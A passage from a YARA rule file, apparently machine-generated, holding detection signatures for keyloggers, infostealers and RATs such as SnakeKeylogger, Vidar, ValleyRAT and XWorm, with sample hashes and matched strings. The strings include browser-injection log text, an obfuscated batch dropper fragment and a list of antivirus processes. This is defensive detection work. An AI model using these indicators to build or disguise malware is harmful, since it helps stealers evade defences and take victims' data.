      $s6 = "Line {0}: {1} - {2}" fullword wide /* score: '12.00'*/
      $s7 = "Help - HTML Validator" fullword wide /* score: '12.00'*/
      $s8 = "Empty Content" fullword wide /* score: '11.00'*/
      $s9 = "HTMLValidator.Forms.ValidationErrorsForm.resources" fullword ascii /* score: '10.00'*/
      $s10 = "RA comprehensive HTML validation tool for checking markup syntax and finding errors" fullword ascii /* score: '10.00'*/
      $s11 = "btnExportErrors_Click" fullword ascii /* score: '10.00'*/
      $s12 = "btnExportErrors" fullword wide /* score: '10.00'*/
      $s13 = "Add alt=\"description\" to the image tag" fullword wide /* score: '10.00'*/
      $s14 = "Error reading file: " fullword wide /* score: '10.00'*/
      $s15 = "HTML Validation Errors Report" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__60126a85_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_36 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_60126a85.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6c8a67ab.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e75aaaa6.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a952e0a.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f853fc6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "60126a8521fe0b76f1c5357efbb3e84e5ec927cb6c03680cfdbc7f992919db3d"
      hash2 = "6c8a67ab3e8dd6a4cee51708117b3ee1c9c34aaa6dee3486413fe8e52f841ec7"
      hash3 = "e75aaaa6410a30b835733ab6886837a76961a478683ef7bcd04467d104befd48"
      hash4 = "1a952e0a7baeed439692541a37291ed5f64c9b6d72233b18d9a32276438315bc"
      hash5 = "2f853fc6240da7009e8c4759a9a6281c02f635dafb83872de2fee28776b9c671"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADkF" fullword ascii /* score: '27.00'*/
      $s2 = "support@lotterysimulation.com" fullword wide /* score: '21.00'*/
      $s3 = "http://tempuri.org/DataSet1.xsd" fullword wide /* score: '17.00'*/
      $s4 = "https://github.com/lottery-simulation" fullword wide /* score: '17.00'*/
      $s5 = "Lottery Simulation - Main" fullword wide /* score: '12.00'*/
      $s6 = "columnHeaderLeastFreq" fullword ascii /* score: '9.00'*/
      $s7 = "get_DefaultMinValue" fullword ascii /* score: '9.00'*/
      $s8 = "get_PlaySounds" fullword ascii /* score: '9.00'*/
      $s9 = "columnHeaderLeastPercent" fullword ascii /* score: '9.00'*/
      $s10 = "columnHeaderLeastNumber" fullword ascii /* score: '9.00'*/
      $s11 = "columnHeaderMostNumber" fullword ascii /* score: '9.00'*/
      $s12 = "get_ConfirmClear" fullword ascii /* score: '9.00'*/
      $s13 = "get_RandomSeed" fullword ascii /* score: '9.00'*/
      $s14 = "get_DefaultNumberCount" fullword ascii /* score: '9.00'*/
      $s15 = "columnHeaderSet" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__e5924a272fbee5c04c949a96084fe740_imphash__Vidar_signature__ed5ee245f8d0a001f3c2285229097130_imphash__Vidar_37 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_e5924a272fbee5c04c949a96084fe740(imphash).exe, Vidar(signature)_ed5ee245f8d0a001f3c2285229097130(imphash).exe, Vidar(signature)_ed5ee245f8d0a001f3c2285229097130(imphash)_d48be991.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ab86a3b79f54f3f9f2f8e7ba05de412f2792df99cbeae0aaeb18a1fbb17afff0"
      hash2 = "cfe6954a7ebc6981c763243fa4f7a62a9eabb6654d3e59743be30c85392a18af"
      hash3 = "d48be991853668424e94b17940a4a011fe759a703c4d7298e985507b468253cc"
   strings:
      $s1 = "C:\\Windows\\system32\\rundll32.exe" fullword ascii /* score: '30.00'*/
      $s2 = "browser=%s, step=create_process_failed, path=%s" fullword ascii /* score: '23.50'*/
      $s3 = "browser=%s, pid=%u, step=injection_failed_return, error=%d" fullword ascii /* score: '22.50'*/
      $s4 = "browser=%s, pid=%u, step=injection_failed, error=%d" fullword ascii /* score: '22.50'*/
      $s5 = "browser=%s, pid=%u, step=payload_request_failed, code=%s" fullword ascii /* score: '21.50'*/
      $s6 = "amcommunity.com" fullword ascii /* score: '21.00'*/
      $s7 = "loginusers.vdf" fullword ascii /* score: '21.00'*/
      $s8 = "browser=%s, step=processes_terminated, checks=%d, procname=%s" fullword ascii /* score: '20.50'*/
      $s9 = "browser=%s, step=process_started, pid=%u" fullword ascii /* score: '20.50'*/
      $s10 = "browser=%s, step=process_tree_killed, pid=%u" fullword ascii /* score: '20.50'*/
      $s11 = "browser=%s, pid=%u, step=injection_begin, mode=%d" fullword ascii /* score: '19.50'*/
      $s12 = "browser=%s, pid=%u, step=pipe_timeout, attempts=%d" fullword ascii /* score: '19.50'*/
      $s13 = "browser=%s, pid=%u, step=key_decoded_from_hex, bytes=%u" fullword ascii /* score: '19.50'*/
      $s14 = "browser=%s, pid=%u, step=injection_succeeded" fullword ascii /* score: '19.50'*/
      $s15 = "browser=%s, pid=%u, step=payload_received, size=%u" fullword ascii /* score: '18.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__208f525c_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_38 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_208f525c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_34de6149.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_43d2268e.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5629466d.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2b1709a9.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67c01a46.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d3d6333f.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d850bddf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "208f525c0534ba85c4b2f456e625a53e783dc8366283895d7a92af194cf5356a"
      hash2 = "34de6149b542022b17b89aec00c7ce4dae3ec04ab4fdc380afa2a3aa211396df"
      hash3 = "43d2268e2ffa3b5ee473e2817bde26b58190c0637f67892203da7397a3e80823"
      hash4 = "5629466db0395c691b3f068e6999e32df38172d270a36c4e265375fe4b814ac4"
      hash5 = "2b1709a9c749ff0e6bca3643813dd090ac492a20104666259f65939d5e0c40b0"
      hash6 = "67c01a468b92e5f7801dcaf9705430e64fd04fd4c14a63f6b83e68d239ac3d06"
      hash7 = "d3d6333fa6a18d44c7a556c541c4e66619f4c7f8b8d241a50587a4185aa39387"
      hash8 = "d850bddfb807d66ca18009750ae4821d82db0640f87e13deb4b80d80b9d5a6f7"
   strings:
      $s1 = "Batch processing completed!" fullword wide /* score: '18.00'*/
      $s2 = "https://github.com/css-minifier" fullword wide /* score: '17.00'*/
      $s3 = "btnProcessAll" fullword wide /* score: '15.00'*/
      $s4 = "btnProcessAll_Click" fullword ascii /* score: '15.00'*/
      $s5 = "Process All" fullword wide /* score: '15.00'*/
      $s6 = " Batch processing" fullword wide /* score: '15.00'*/
      $s7 = "GetMinifierSettings" fullword ascii /* score: '9.00'*/
      $s8 = "cssContent" fullword ascii /* score: '9.00'*/
      $s9 = "GetOptimizerSettings" fullword ascii /* score: '9.00'*/
      $s10 = "File Manager" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s11 = "Remove Comments" fullword wide /* score: '9.00'*/
      $s12 = " Combine selectors" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__30119059_VIPKeylogger_signature__f34d5f2d4577ed6d9ceec5_39 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_30119059.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6faee39a.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d8b8bcd9.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b2ef374.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3011905982645d621f3168cfb565220f158126bc58820062a944aa74974c988d"
      hash2 = "6faee39a93b479e25eb9f5a8a9a3817f2ebda7e17c650c07f02bee1495db7c9e"
      hash3 = "d8b8bcd90b1f424932f634abe840ef099e8f19a48e0199265a97056ac6c79851"
      hash4 = "6b2ef374ac650c3624e17bef81fa74572d4cf67bf815a8927447aba4c5da9d00"
   strings:
      $s1 = "https://bloggingmetrics.com/" fullword wide /* score: '22.00'*/
      $s2 = "get_DependencyInjector" fullword ascii /* score: '19.00'*/
      $s3 = "GetInjectedInstance" fullword ascii /* score: '19.00'*/
      $s4 = "GetConstructorInjectAttribute" fullword ascii /* score: '19.00'*/
      $s5 = "GetPropertyInjectAttribute" fullword ascii /* score: '19.00'*/
      $s6 = "andExecuteFollowingCode" fullword ascii /* score: '18.00'*/
      $s7 = "Login Faild" fullword wide /* score: '18.00'*/
      $s8 = "Unable to inject a parameter that is not an interface or abstract type." fullword wide /* score: '18.00'*/
      $s9 = "SELECT * FROM tbl_users WHERE username = '" fullword wide /* score: '16.00'*/
      $s10 = "btnLogin_Click" fullword ascii /* score: '15.00'*/
      $s11 = "Login_and_Register.Properties.Resources.resources" fullword ascii /* score: '15.00'*/
      $s12 = "clickLogin_Click" fullword ascii /* score: '15.00'*/
      $s13 = "Login_and_Register.frmDashboard.resources" fullword ascii /* score: '15.00'*/
      $s14 = "Login_and_Register.Properties" fullword ascii /* score: '15.00'*/
      $s15 = "Login_and_Register" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__018d7c99_Vidar_signature__d42595b695fc008ef2c56aabd8efd68e_i_40 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash2 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "runtime.stackPoisonCopy" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s3 = "errors.ErrUnsupported" fullword ascii /* score: '16.00'*/
      $s4 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s5 = "os.useGetTempPath2" fullword ascii /* score: '16.00'*/
      $s6 = "runtime.ntdlldll" fullword ascii /* score: '15.00'*/
      $s7 = "runtime._ProcessPrng" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.bcryptprimitivesdll" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.overrideWrite" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.powrprofdll" fullword ascii /* score: '15.00'*/
      $s11 = "runtime._RtlGetVersion" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.winmmdll" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.systemstack_switch.abi0" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.systemstack.abi0" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.readRandomFailed" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6e4713d8_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_41 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6e4713d8.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ec3552d5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e4713d811e797b9d0327b4f9202b15158b13b16fb29094ddf18d277e21d67b2"
      hash2 = "ec3552d534b6d4838a7591ad19685d24f330c1fe29aa6b8b476d77c4a808d363"
   strings:
      $s1 = "This will attempt to enable System Protection. You may need administrator privileges. Continue?" fullword wide /* score: '23.00'*/
      $s2 = "https://github.com" fullword wide /* score: '21.00'*/
      $s3 = "GetSystemProtectionStatus" fullword ascii /* score: '19.00'*/
      $s4 = "Failed to enable System Protection. Please check your administrator privileges." fullword wide /* score: '17.00'*/
      $s5 = "{0:yyyy-MM-dd HH:mm:ss} - {1}" fullword wide /* score: '15.00'*/
      $s6 = "chkSystemProtection" fullword wide /* score: '14.00'*/
      $s7 = "btnEnableSystemProtection_Click" fullword ascii /* score: '14.00'*/
      $s8 = "lblSystemProtectionStatus" fullword wide /* score: '14.00'*/
      $s9 = "btnEnableSystemProtection" fullword wide /* score: '14.00'*/
      $s10 = "IsSystemProtectionEnabled" fullword ascii /* score: '14.00'*/
      $s11 = "grpSystemProtection" fullword wide /* score: '14.00'*/
      $s12 = "SELECT * FROM SystemRestoreConfig" fullword wide /* score: '14.00'*/
      $s13 = "Failed to create restore point. Please ensure you have administrator privileges." fullword wide /* score: '14.00'*/
      $s14 = "Failed to delete restore point. You may need administrator privileges." fullword wide /* score: '14.00'*/
      $s15 = "GetLastSystemScan" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__XWorm_signature__01b32400_42 {
   meta:
      description = "_subset_batch - from files XWorm(signature).bat, XWorm(signature)_01b32400.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ebd8f8450112f4cefdbba8c7dac16fbb8d4473fb626b40bb20134518bace723e"
      hash2 = "01b32400dada222a87a21834ceb8cd7fc95b88da0561711b81e027e8974eede3"
   strings:
      $s1 = "at% %KrJrGo%?%hLuibW%'%tFlVmrrat%k%Kczh%?%KiQso% %pf%?%zrd% %NCj%?%gq% %dTRNPdTrqm%?%k% %fWUpiDptm%?%PVVvuHAnEL%V%RRmRyOdyZp%u%B" ascii /* score: '13.00'*/
      $s2 = "%hLuibW%'%tFlVmrrat%k%Kczh%" fullword ascii /* score: '13.00'*/
      $s3 = "s%vm%e%V%t%vDyZ% %g%\"%CXXxITAmYX%a%RjLCAUio%l%y%i%uLnlqirPkG%c%PqTiDSMZ%a%dCbtLfWW%n%uCMgNHH%t%kAGrRYP%i%cYRMs%n%AiCrtW%e%jrrBI" ascii /* score: '12.00'*/
      $s4 = "%jZ%a%uBu%H%ktILQXwY%R%hDkZmfUt%0%kC%c%LEOoRtmeBn%H%uzpffm%M%vg%6%S%L%JRVS%y%iyJ%8%QIoLl%x%nsXtLhXL%N%QliZNUDBC%T%nleTKXIB%g%lUS" ascii /* score: '11.00'*/
      $s5 = "k%i%PjEDX%r%uYfhIVJa%o%bxjaQXXyzO%=%XoLTLX%(%vWB%?%ZNAqHEwA% %hCwFVfd%?%Yorzli% %tLEe%?%bxyD% %Ru%?%QTncnlYc% %zeYJ%?%UlGJ%(%I%?" ascii /* score: '11.00'*/
      $s6 = "%jZ%a%uBu%H%ktILQXwY%R%hDkZmfUt%0%kC%c%LEOoRtmeBn%H%uzpffm%M%vg%6%S%L%JRVS%y%iyJ%8%QIoLl%x%nsXtLhXL%N%QliZNUDBC%T%nleTKXIB%g%lUS" ascii /* score: '11.00'*/
      $s7 = "%FEtuBcKH% %d%" fullword ascii /* score: '11.00'*/
      $s8 = "DEvz% %XUoS%?%awvoFfVI% %NXcewPY%?%d% %GUiUlG%?%Lpe% %tx%?%jZ%a%uBu%H%ktILQXwY%R%hDkZmfUt%0%kC%c%LEOoRtmeBn%H%uzpffm%M%vg%6%S%L%" ascii /* score: '11.00'*/
      $s9 = "%UlGJ%(%I%" fullword ascii /* score: '11.00'*/
      $s10 = " %WdiGWlAdl%?%rVpnI%e%kqgN%'%mcEtHYbK%+%efDjEOlfU%?%dTu% %Axiggy%?%RWMJJJv% %aqV%?%D% %Bea%?%ltju% %URbtNQPou%?%JBfAvZeRh%'%ayhQ" ascii /* score: '11.00'*/
      $s11 = "%RfLm%l%smndZ%e%fYKySDkpI% %OCvx%H%PaprUnH%" fullword ascii /* score: '11.00'*/
      $s12 = "%zMeYnan% %OtEzW%" fullword ascii /* score: '8.00'*/
      $s13 = "%QCfOgqxarI% %boJKTH%" fullword ascii /* score: '8.00'*/
      $s14 = "%CGAXOKCqqz%S%AZJPfcu%t%lpPEqXYnO%" fullword ascii /* score: '8.00'*/
      $s15 = "%kglaHU% %NWwvXwdHGn%" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x6177 or uint16(0) == 0x6964 ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SalatStealer_signature__351592d5ead6df0859b0cc0056827c95_imphash__SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_im_43 {
   meta:
      description = "_subset_batch - from files SalatStealer(signature)_351592d5ead6df0859b0cc0056827c95(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_0931b295.exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_59c6cebf.exe, ValleyRAT(signature)_15d53913ba494ccc61512607f46fddf4(imphash).exe, ValleyRAT(signature)_15d53913ba494ccc61512607f46fddf4(imphash)_1e647e0f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73c4d642eea0d8b2f9e8fa2f6328d5a94a9c929681063fdf6c7560d0c721efee"
      hash2 = "83160cab62b17b3e27bf30dc7ad8ca99d3892e31d18a9a0c404b832312c4264e"
      hash3 = "0931b295ce7053441ed05872c12493ed9b4bbca14ae9642d1d073d8a52ec5e0c"
      hash4 = "59c6cebfc1b60e8fed91078d412784d3a888034356bd8928a67921d56d222b29"
      hash5 = "a226d9a4f1456774355d091f2f680286508e204dfecc9b439697140ac41ecb23"
      hash6 = "1e647e0ff0bc7a5dcfe1577093e2182fed5ffb01b6d18ebeec9d2d0a98fd19fa"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s4 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s5 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s6 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s7 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s8 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s9 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s10 = "Failed to initialize security descriptor for temporary directory!" fullword ascii /* score: '20.00'*/
      $s11 = "%s%c%s.exe" fullword ascii /* score: '20.00'*/
      $s12 = "LOADER: failed to set the TMP environment variable." fullword wide /* score: '19.00'*/
      $s13 = "Failed to create child process!" fullword wide /* score: '18.00'*/
      $s14 = "Failed to extract %s: decompression resulted in return code %d!" fullword ascii /* score: '15.50'*/
      $s15 = "Failed to extract %s: failed to allocate temporary output buffer!" fullword ascii /* score: '15.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__5ca63e698995b82aec5db51f75c714b8_imphash__ValleyRAT_signature__c7066ddaba2ac5aa4587c720270623e6_imphas_44 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_5ca63e698995b82aec5db51f75c714b8(imphash).dll, ValleyRAT(signature)_c7066ddaba2ac5aa4587c720270623e6(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd5bebc6df7e22fe7d1d659cbbd3c1f495af3f9bcff69838523fd10f17b1d152"
      hash2 = "d9c850e495595fe7b1824f7a4a2c2da7de17540eb4af37881f7d3c10cdd7d81c"
   strings:
      $s1 = "Windows\\System32\\svchost.exe" fullword ascii /* score: '28.00'*/
      $s2 = "rtvscan.exe" fullword wide /* score: '23.00'*/
      $s3 = "kscan.exe" fullword wide /* score: '23.00'*/
      $s4 = "ontdll.dll" fullword wide /* score: '23.00'*/
      $s5 = "UnThreat.exe" fullword wide /* score: '22.00'*/
      $s6 = "K7TSecurity.exe" fullword wide /* score: '22.00'*/
      $s7 = "PSafeSysTray.exe" fullword wide /* score: '22.00'*/
      $s8 = "remupd.exe" fullword wide /* score: '22.00'*/
      $s9 = "ashDisp.exe" fullword wide /* score: '22.00'*/
      $s10 = "knsdtray.exe" fullword wide /* score: '22.00'*/
      $s11 = "Mcshield.exe" fullword wide /* score: '22.00'*/
      $s12 = "avgwdsvc.exe" fullword wide /* score: '22.00'*/
      $s13 = "SPIDer.exe" fullword wide /* score: '22.00'*/
      $s14 = "mssecess.exe" fullword wide /* score: '22.00'*/
      $s15 = "QUHLPSVC.EXE" fullword wide /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cc281b8e_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a_45 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cc281b8e.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_58402722.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc281b8e3d99a039ed27fb86ca7220936806d15a45440b5c035fa2bcd2553946"
      hash2 = "58402722fce8bf2518986d3c676e8c0a30525145680e680b6bcc01b74e9fd003"
   strings:
      $s1 = "daybreak.exe" fullword wide /* score: '22.00'*/
      $s2 = "DaybreakDX.exe" fullword wide /* score: '22.00'*/
      $s3 = "/config.dat" fullword wide /* score: '14.00'*/
      $s4 = "/addresslist.txt" fullword wide /* score: '14.00'*/
      $s5 = "getCurrentListAddress" fullword ascii /* score: '12.00'*/
      $s6 = "getAddresses" fullword ascii /* score: '12.00'*/
      $s7 = "HigurashiDaybreakConfig.FormConfig.resources" fullword ascii /* score: '10.00'*/
      $s8 = "HigurashiDaybreakConfig.FormMyConf.resources" fullword ascii /* score: '10.00'*/
      $s9 = "config.json" fullword wide /* score: '10.00'*/
      $s10 = "_getBool" fullword ascii /* score: '9.00'*/
      $s11 = "getVolvoice" fullword ascii /* score: '9.00'*/
      $s12 = "getVolVoice" fullword ascii /* score: '9.00'*/
      $s13 = "getTexture" fullword ascii /* score: '9.00'*/
      $s14 = "get_GameFolder" fullword ascii /* score: '9.00'*/
      $s15 = "getShadows" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__6aa7899735e1f990142bacb29f0dd_46 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash3 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash4 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash5 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "MpGetConfigPayloadStatus" fullword ascii /* score: '21.00'*/
      $s2 = "MpGetThreatExecutionInfo" fullword ascii /* score: '21.00'*/
      $s3 = "MpGetAsrBlockedProcesses" fullword ascii /* score: '20.00'*/
      $s4 = "MpGetCopyAcceleratorProcessStatus" fullword ascii /* score: '20.00'*/
      $s5 = "MpImportConfigPayload" fullword ascii /* score: '19.00'*/
      $s6 = "MpElevationHandleActivate" fullword ascii /* score: '16.00'*/
      $s7 = "MpElevationHandleAcquire" fullword ascii /* score: '16.00'*/
      $s8 = "MpElevationHandleAttach" fullword ascii /* score: '16.00'*/
      $s9 = "MpSetUacElevationDefaultWindowHandle" fullword ascii /* score: '16.00'*/
      $s10 = "MpElevationHandleOpen" fullword ascii /* score: '16.00'*/
      $s11 = "MpShutdownCopyAcceleratorProcess" fullword ascii /* score: '15.00'*/
      $s12 = "MpConveyDlpBypass" fullword ascii /* score: '15.00'*/
      $s13 = "MpDlpGetOperationEnforcmentMode" fullword ascii /* score: '14.00'*/
      $s14 = "MpServiceLogMessage" fullword ascii /* score: '12.00'*/
      $s15 = "MpGetConfigValue" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphas_47 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash2 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash3 = "23b2938d3c84a2157ba0a8347c1b62cf3f05dd5eaf53ddcea431efe6434c2074"
      hash4 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s2 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s3 = "os.executable" fullword ascii /* score: '16.00'*/
      $s4 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s5 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s6 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s7 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s8 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s9 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s11 = "errors.New" fullword ascii /* score: '13.00'*/
      $s12 = "internal/reflectlite.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s13 = "readbyte" fullword ascii /* score: '11.00'*/
